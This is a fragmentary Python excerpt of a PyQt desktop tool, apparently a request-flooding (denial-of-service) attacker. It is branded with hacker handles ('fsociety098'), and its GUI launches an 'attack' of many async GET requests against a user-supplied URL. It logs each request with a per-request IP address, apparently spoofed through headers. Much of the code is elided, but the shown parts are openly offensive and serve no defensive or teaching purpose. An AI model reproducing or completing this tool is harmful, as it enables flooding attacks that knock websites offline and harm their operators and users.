    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"ʘxV1яυŜ@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  
...
class MainWindow(QMainWindow):
    def __init__(self):
        ...
        pixmap = QPixmap()
        pixmap.loadFromData(
            requests.get("https://is.zobj.net/image-server/v1/images?r=_fHQoY5raE8W5v8PQryD5-dF4UtCVzbRZhBb26BxxLmkzCJX_8NyWgXb3sZJMhc4KybEeXkFpaTCw6dkNZ0atufueNLE8R8tyF50akWnvwrXCW9buF6lBoPIaThph0AP_hqntw1zojDVRFO7bBZEGtnctzjXDz2qhs7pD_WPSoYAnw97t4lGTiA2ttuJxtt7G5e8DXc3p19oJsRCY5k08IRhX1CziPYfo10Zuw").content)
        ...
        slogan = QLabel("🧠 <i>TikTok: fsociety098</i><br>🧠 <i>GitHub: Fsoceityyyy</i>")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "ʘxV1яυŜ", "Number of requests must be an integer!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "ʘxV1яυŜ", "Enter a valid URL and number of requests!")
            return
        ...
        QMessageBox.information(self, "ʘxV1яυŜ", "Attack has begun! Check the logs!")
